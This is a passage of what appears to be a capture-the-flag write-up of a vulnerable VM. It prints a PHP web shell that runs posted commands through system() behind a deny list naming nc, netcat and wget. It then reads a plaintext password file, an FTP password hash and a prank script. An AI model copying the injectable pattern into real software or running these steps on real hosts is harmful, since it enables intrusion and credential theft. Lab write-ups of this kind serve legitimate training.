-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;$ cat dev_shell.php
-cat dev_shell.php
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;
-  &lt;span class=&quot;cp&quot;&gt;&amp;lt;?php
-    //init
-    $invalid = 0;
-    $command = ($_POST['in_command']);
-    $bad_words = array(&quot;pwd&quot;, &quot;ls&quot;, &quot;netcat&quot;, &quot;ssh&quot;, &quot;wget&quot;, &quot;ping&quot;, &quot;traceroute&quot;, &quot;cat&quot;, &quot;nc&quot;);
-  ?&amp;gt;&lt;/span&gt;
-  &lt;span class=&quot;nt&quot;&gt;&amp;lt;style&amp;gt;&lt;/span&gt;
-    &lt;span class=&quot;nf&quot;&gt;#back&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-      &lt;span class=&quot;nl&quot;&gt;position&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;fixed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-      &lt;span class=&quot;nl&quot;&gt;top&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-      &lt;span class=&quot;nl&quot;&gt;left&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-      &lt;span class=&quot;nl&quot;&gt;min-width&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;100%&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-      &lt;span class=&quot;nl&quot;&gt;min-height&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;100%&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-      &lt;span class=&quot;nl&quot;&gt;z-index&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;-10&lt;/span&gt;
-    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-      &lt;span class=&quot;nf&quot;&gt;#shell&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-        &lt;span class=&quot;nl&quot;&gt;color&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;white&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-        &lt;span class=&quot;nl&quot;&gt;text-align&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;center&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-  &lt;span class=&quot;nt&quot;&gt;&amp;lt;/style&amp;gt;&lt;/span&gt;
-  &lt;span class=&quot;c&quot;&gt;&amp;lt;!-- WIP, don't forget to report any bugs we don't want another breach guys
-  -Bob --&amp;gt;&lt;/span&gt;
-  &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;shell&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
-    &lt;span class=&quot;nt&quot;&gt;&amp;lt;h2&amp;gt;&lt;/span&gt;
-      dev_shell
-    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/h2&amp;gt;&lt;/span&gt;
-    &lt;span class=&quot;nt&quot;&gt;&amp;lt;form&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;action=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;dev_shell.php&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;method=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;post&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
-      Command: &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;text&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;in_command&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;&amp;lt;br&amp;gt;&lt;/span&gt;
-      &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;submit&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;submit&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
-    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/form&amp;gt;&lt;/span&gt;
-    &lt;span class=&quot;nt&quot;&gt;&amp;lt;br&amp;gt;&lt;/span&gt;
-    &lt;span class=&quot;nt&quot;&gt;&amp;lt;h5&amp;gt;&lt;/span&gt;Output:&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h5&amp;gt;&lt;/span&gt;
-    &lt;span class=&quot;cp&quot;&gt;&amp;lt;?php
-    system(&quot;running command...&quot;);
-      //executes system Command
-      //checks for sneaky ;
-      if (strpos($command, ';') !==false){
-        system(&quot;echo Nice try skid, but you will never get through this bulletproof php code&quot;); //doesn't work :P
-      }
-      else{
-        $is_he_a_bad_man = explode(' ', trim($command));
-        //checks for dangerous commands
-        if (in_array($is_he_a_bad_man[0], $bad_words)){
-          system(&quot;echo Get out skid lol&quot;);
-        }
-        else{
-          system($_POST['in_command']);
-        }
-      }
-    ?&amp;gt;&lt;/span&gt;
-  &lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
-    &lt;span class=&quot;nt&quot;&gt;&amp;lt;img&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;dev_shell_back.png&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;back&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;alt=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Then I went straight into the user home directories. Let’s see them.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;home
-&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;home
-&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
-&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
-total 24
-drwxr-xr-x  6 root   root   4096 Mar  4 13:45 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-drwxr-xr-x 22 root   root   4096 Mar  5 04:50 ..
-drwxr-xr-x 18 bob    bob    4096 Mar  5 04:53 bob
-drwxr-xr-x 15 elliot elliot 4096 Feb 27 18:38 elliot
-drwxr-xr-x 15 jc     jc     4096 Feb 27 18:20 jc
-drwxr-xr-x 15 seb    seb    4096 Mar  5 01:18 seb&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;We can start with Bob as he’s our hero today.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;bob
-&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;bob
-&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
-&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
-total 188
-drwxr-xr-x 18 bob  bob   4096 Mar  5 04:53 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-drwxr-xr-x  6 root root  4096 Mar  4 13:45 ..
-&lt;span class=&quot;nt&quot;&gt;-rw-------&lt;/span&gt;  1 bob  bob    990 Mar  5 04:53 .ICEauthority
-&lt;span class=&quot;nt&quot;&gt;-rw-------&lt;/span&gt;  1 bob  bob    214 Mar  5 04:53 .Xauthority
-&lt;span class=&quot;nt&quot;&gt;-rw-------&lt;/span&gt;  1 bob  bob   6366 Mar  5 04:38 .bash_history
-&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 bob  bob    220 Feb 21 18:10 .bash_logout
-&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 bob  bob   3548 Mar  5 01:14 .bashrc
-drwxr-xr-x  7 bob  bob   4096 Feb 21 18:15 .cache
-drwx------  8 bob  bob   4096 Feb 27 17:56 .config
-&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 bob  bob     55 Feb 21 18:22 .dmrc
-drwxr-xr-x  2 bob  bob   4096 Feb 21 19:48 .ftp
-drwx------  3 bob  bob   4096 Mar  5 00:45 .gnupg
-drwxr-xr-x  3 bob  bob   4096 Feb 21 18:13 .local
-drwx------  4 bob  bob   4096 Feb 21 18:13 .mozilla
-drwxr-xr-x  2 bob  bob   4096 Mar  4 14:03 .nano
-&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 bob  bob     72 Mar  5 04:12 .old_passwordfile.html
-&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 bob  bob    675 Feb 21 18:10 .profile
-drwx------  2 bob  bob   4096 Mar  5 02:45 .vnc
-&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 bob  bob  30922 Mar  5 04:53 .xfce4-session.verbose-log
-&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 bob  bob  29997 Mar  5 02:56 .xfce4-session.verbose-log.last
-&lt;span class=&quot;nt&quot;&gt;-rw-------&lt;/span&gt;  1 bob  bob   3165 Mar  5 04:53 .xsession-errors
-&lt;span class=&quot;nt&quot;&gt;-rw-------&lt;/span&gt;  1 bob  bob   8886 Mar  5 02:56 .xsession-errors.old
-drwxr-xr-x  2 bob  bob   4096 Feb 21 18:13 Desktop
-drwxr-xr-x  3 bob  bob   4096 Mar  5 01:02 Documents
-drwxr-xr-x  3 bob  bob   4096 Mar  5 00:17 Downloads
-drwxr-xr-x  2 bob  bob   4096 Feb 21 18:13 Music
-drwxr-xr-x  2 bob  bob   4096 Feb 21 18:13 Pictures
-drwxr-xr-x  2 bob  bob   4096 Feb 21 18:13 Public
-drwxr-xr-x  2 bob  bob   4096 Feb 21 18:13 Templates
-drwxr-xr-x  2 bob  bob   4096 Feb 21 18:13 Videos
-&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; .old_passwordfile.html
-&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; .old_passwordfile.html
-&amp;lt;html&amp;gt;
-&amp;lt;p&amp;gt;
-jc:Qwerty
-seb:T1tanium_Pa&lt;span class=&quot;nv&quot;&gt;$$&lt;/span&gt;word_Hack3rs_Fear_M3
-&amp;lt;/p&amp;gt;
-&amp;lt;/html&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Great, we have the passwords! Now let’s look for more clues.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt; Downloads
-&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt; Downloads
-total 728
-drwxr-xr-x  3 bob  bob    4096 Mar  5 00:17 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-drwxr-xr-x 18 bob  bob    4096 Mar  5 04:53 ..
-&lt;span class=&quot;nt&quot;&gt;-r--r--r--&lt;/span&gt;  1 root root     71 Feb 21 19:18 .bobftp.bak
-&lt;span class=&quot;nt&quot;&gt;-rwxr-xr-x&lt;/span&gt;  1 bob  bob     138 Mar  5 00:03 Hello_Again.py
-&lt;span class=&quot;nt&quot;&gt;-rwxr-xr-x&lt;/span&gt;  1 bob  bob    7446 Mar  5 00:17 Wheel_Of_Fortune.py
-&lt;span class=&quot;nt&quot;&gt;-rwxr-xr-x&lt;/span&gt;  1 bob  bob   28692 Nov 30  2010 ftpasswd
-drwxr-xr-x 14 bob  bob    4096 Feb 21 18:23 proftpd-1.3.3c
-&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 bob  bob  681864 Feb 21 18:15 wallpaper.wiki-HD-Bobcat-Wallpaper-PIC-WPB0014118.jpg
-
-&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; .bobftp.bak
-&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; .bobftp.bak
-bob:&lt;span class=&quot;nv&quot;&gt;$1$Qiy3X9sL$0U5QdO1kxUaU2CrzXAy8W0&lt;/span&gt;:1001:1001::/home/bob:/bin/false
-
-&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;Hello_Again.py
-&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;Hello_Again.py
-&lt;span class=&quot;c&quot;&gt;#!/usr/bin/python3&lt;/span&gt;
-import os
-import &lt;span class=&quot;nb&quot;&gt;time
-&lt;/span&gt;from random import &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;while &lt;/span&gt;True:
-    time.sleep&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;randint&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1,10&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
-    os.system&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;echo Hello Again&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-
-
-&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;Wheel_Of_Fortune.py
-&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;Wheel_Of_Fortune.py&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;c&quot;&gt;#!/usr/bin/python3&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;#W.I.P&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;#~c0rruptedb1t&lt;/span&gt;
-&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;os&lt;/span&gt;
-&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;random&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
-&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;time&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;ruinsearchlist&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'fuuny mems'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'safe for work'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'not sus searches'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'hey im 4th!'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;ruinsearchlists&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'how to appear funny'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'why are my thumbs uneven'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'am i lack toast and tolerant'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'your youre difference'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'why doesnt my poo float'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'midget google images'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'tall midgets??'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'homemade lube?'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'i hate my boss'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'what counts as fat'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'how to tell partner they fat'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'is it normal to still love my ex'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'how to get back with ex'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'penis remove dog how to'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'romantic ways to propose'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'engagement rings'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'sex shop in my city'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'how to tell if partner cheating'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'ways to kill someone hypothetically'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'undetectable poisons'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'how to delete search history in browser'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'ashley madison hack'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'view ashley madison list'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'ashley madison list my city'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'paternity test'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'mail order paternity test'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'attracted to mother why'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'is incest illegal in this country'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'latest laws incest'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'seduction guide'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'rohypnol safe dosage'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'smelly penis cure urgent'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'common STIs'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'STI test in my city'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'average penis size this country'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'do penis pumps work'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'best budget penis pumps'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'does liking men mean im gay'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'signs of being gay'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'how to come out as gay to dad'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'age of consent here'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'why is age of consent so old here'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'country low age of consent'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'flights philippines'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'isis application form'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'how to join isis'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'cheap syria flights from here'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'syria hotels with pool'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'bing'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'donald trump'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'OH COME ON DONT JUST COPY AND PASTE THE LIST FROM THE ARRAY YOU CHEEKY SCAMP'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;ph&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;echodatastr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;wheel&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-
-&lt;span class=&quot;c&quot;&gt;#INIT&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;clear&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;ph&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;If you want more exciting prizes make sure to run the program as root as some of the prizes need root access as well as an internet connection, I know it sounds pretty dodgey you can look through the source code if you want [to run as root type: 'sudo ./Wheel_Of_Fortune.py'] &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; Press Enter To Continue...&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;clear&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Making sure you're apt is up to date&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;sudo apt-get update&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;clear&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-
-&lt;span class=&quot;c&quot;&gt;#Echodata&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;echodata&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;global&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;echodatastr&lt;/span&gt;
